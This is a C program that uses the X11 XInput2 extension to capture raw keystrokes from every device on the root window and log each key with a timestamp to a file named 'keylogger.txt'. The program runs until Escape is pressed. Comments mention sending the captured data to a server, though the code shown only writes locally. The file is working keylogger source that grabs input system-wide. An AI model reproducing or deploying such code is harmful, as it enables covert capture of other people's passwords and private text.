#include <X11/Xlib.h>
#include <X11/extensions/XInput.h>
#include <X11/extensions/XInput2.h>
#include <X11/Xutil.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/time.h>

const char *detailToKey[] = {
    "", // 0
    "", // 1
    "", // 2
    "", // 3
    "", // 4
    "", // 5
    "", // 6
    "", // 7
    "", // 8
    "", // 9
    "", // 10
    "", // 11
    "", // 12
    "", // 13
    "", // 14
    "", // 15
    "", // 16
    "", // 17
    "", // 18
    "", // 19
    "", // 20
    "", // 21
    "", // 22
    "", // 23
    "", // 24
    "", // 25
    "", // 26
    "", // 27
    "", // 28
    "", // 29
    "", // 30
    "", // 31
    "", // 32
    "", // 33
    "", // 34
    "", // 35
    "", // 36
    "", // 37
    "a", // 38
    "s", // 39
    "d", // 40
    "f", // 41
    "g", // 42
    "h", // 43
    "j", // 44
    "k", // 45
    "l", // 46
    ";", // 47
    "'", // 48
    "", // 49
    "", // 50
    "", // 51
    "z", // 52
    "x", // 53
    "c", // 54
    "v", // 55
    "b", // 56
    "n", // 57
    "m", // 58
    ",", // 59
    ".", // 60
};


static void print_rawevent(XIRawEvent *event)
{
    int i;
    double *val, *raw_val;
    
    return;
    
    printf("    device: %d (%d)\n", event->deviceid, event->sourceid);
    printf("    detail: %d\n", event->detail);
#if HAVE_XI21
    switch(event->evtype) {
        case XI_RawButtonPress:
        case XI_RawButtonRelease:
        case XI_RawMotion:
            printf("    flags: %s\n", (event->flags & XIPointerEmulated) ?  "emulated" : "");
            break;
    }
#endif

    printf("    valuators:\n");
    val = event->valuators.values;
    raw_val = event->raw_values;
    for (i = 0; i < event->valuators.mask_len * 8; i++)
        if (XIMaskIsSet(event->valuators.mask, i))
            printf("         %2d: %.2f (%.2f)\n", i, *val++, *raw_val++);
    printf("\n");
}

static const char* type_to_name(int evtype)
{
    const char *name;

    switch(evtype) {
        case XI_DeviceChanged:    name = "DeviceChanged";       break;
        case XI_KeyPress:         name = "KeyPress";            break;
        case XI_KeyRelease:       name = "KeyRelease";          break;
        case XI_ButtonPress:      name = "ButtonPress";         break;
        case XI_ButtonRelease:    name = "ButtonRelease";       break;
        case XI_Motion:           name = "Motion";              break;
        case XI_Enter:            name = "Enter";               break;
        case XI_Leave:            name = "Leave";               break;
        case XI_FocusIn:          name = "FocusIn";             break;
        case XI_FocusOut:         name = "FocusOut";            break;
        case XI_HierarchyChanged: name = "HierarchyChanged";    break;
        case XI_PropertyEvent:    name = "PropertyEvent";       break;
        case XI_RawKeyPress:      name = "RawKeyPress";         break;
        case XI_RawKeyRelease:    name = "RawKeyRelease";       break;
        case XI_RawButtonPress:   name = "RawButtonPress";      break;
        case XI_RawButtonRelease: name = "RawButtonRelease";    break;
        case XI_RawMotion:        name = "RawMotion";           break;
        case XI_TouchBegin:       name = "TouchBegin";          break;
        case XI_TouchUpdate:      name = "TouchUpdate";         break;
        case XI_TouchEnd:         name = "TouchEnd";            break;
        case XI_RawTouchBegin:    name = "RawTouchBegin";       break;
        case XI_RawTouchUpdate:   name = "RawTouchUpdate";      break;
        case XI_RawTouchEnd:      name = "RawTouchEnd";         break;
        default:
                                  name = "unknown event type"; break;
    }
    return name;
}

int main() {
    Display *display;
    int xi_opcode;
    int event, error;

    int deviceid = -1;
    Window win;
    XIEventMask mask[2];
    XIEventMask *m;

    display = XOpenDisplay(NULL);
    if (display == NULL) {
        return 1;
    }

    if (!XQueryExtension(display, "XInputExtension", &xi_opcode, &event, &error)) {
        printf("X Input extension not available.\n");
        return 1;
    }

    win = DefaultRootWindow(display);

    /* Select for motion events */
    m = &mask[0];
    m->deviceid = (deviceid == -1) ? XIAllDevices : deviceid;
    m->mask_len = XIMaskLen(XI_LASTEVENT);
    m->mask = calloc(m->mask_len, sizeof(char));
    XISetMask(m->mask, XI_ButtonPress);
    XISetMask(m->mask, XI_ButtonRelease);
    XISetMask(m->mask, XI_KeyPress);
    XISetMask(m->mask, XI_KeyRelease);
    XISetMask(m->mask, XI_Motion);
    XISetMask(m->mask, XI_DeviceChanged);
    XISetMask(m->mask, XI_Enter);
    XISetMask(m->mask, XI_Leave);
    XISetMask(m->mask, XI_FocusIn);
    XISetMask(m->mask, XI_FocusOut);
#if HAVE_XI22
    XISetMask(m->mask, XI_TouchBegin);
    XISetMask(m->mask, XI_TouchUpdate);
    XISetMask(m->mask, XI_TouchEnd);
#endif
    if (m->deviceid == XIAllDevices)
        XISetMask(m->mask, XI_HierarchyChanged);
    XISetMask(m->mask, XI_PropertyEvent);

    m = &mask[1];
    m->deviceid = (deviceid == -1) ? XIAllMasterDevices : deviceid;
    m->mask_len = XIMaskLen(XI_LASTEVENT);
    m->mask = calloc(m->mask_len, sizeof(char));
    XISetMask(m->mask, XI_RawKeyPress);
    XISetMask(m->mask, XI_RawKeyRelease);
    XISetMask(m->mask, XI_RawButtonPress);
    XISetMask(m->mask, XI_RawButtonRelease);
    XISetMask(m->mask, XI_RawMotion);
#if HAVE_XI22
    XISetMask(m->mask, XI_RawTouchBegin);
    XISetMask(m->mask, XI_RawTouchUpdate);
    XISetMask(m->mask, XI_RawTouchEnd);
#endif

    XISelectEvents(display, win, &mask[0], 2);
    XSync(display, False);

    free(mask[0].mask);
    free(mask[1].mask);


    XEvent ev;
    XGenericEventCookie *cookie;
    KeySym ks;
    char str[256];
    XKeyEvent *e;
    int nbytes;
    
    XIDeviceEvent *d_ev;
    int keysyms_per_keycode;
    KeyCode keycode;
    KeySym *keysym;
    char * result;
    char lookupStr[256];
    FILE *logFile;
    struct timeval tv;

    logFile = fopen("keylogger.txt", "w");

    while (1) {
        cookie = (XGenericEventCookie*)&ev.xcookie;
        XNextEvent(display, &ev);
        
        if (XGetEventData(display, cookie) &&
            cookie->type == GenericEvent &&
            cookie->extension == xi_opcode) {
            // Send cookie to server
            // Log cookie to file
            switch (cookie->evtype) {
                case XI_RawKeyPress:
                case XI_RawKeyRelease:
                //case XI_RawButtonPress:
                //case XI_RawButtonRelease:
                //case XI_RawMotion:
                case XI_RawTouchBegin:
                case XI_RawTouchUpdate:
                case XI_RawTouchEnd:
                    //printf( "KeyPress: %x\n", ev.xkey.keycode );
                    //printf("EVENT type %d (%s)\n", cookie->evtype, type_to_name(cookie->evtype));
                    //print_rawevent(cookie->data);

                    d_ev = (XIDeviceEvent*) ev.xcookie.data;
                    keycode = d_ev->detail;
                    keysym = XGetKeyboardMapping (display, keycode, 1, &keysyms_per_keycode);
                    result = XKeysymToString (keysym[0]);
                    gettimeofday(&tv, NULL);
                    fprintf(logFile, "%s, %ld, %ld\n", result, tv.tv_sec, tv.tv_usec);
                    fflush(logFile);
                    if (strcmp(result, "Escape") == 0) {
                        fclose(logFile);
                        XFreeEventData(display, cookie);
                        goto Exit;
                    }
                    //XLookupString((XKeyEvent *)&ev, lookupStr, 256, &ks, NULL);
                    //printf("%d\n", ks);
                    break;
             }

        }
        
        XFreeEventData(display, cookie);
    }
    Exit:
    XDestroyWindow(display, win);

    return 0;
}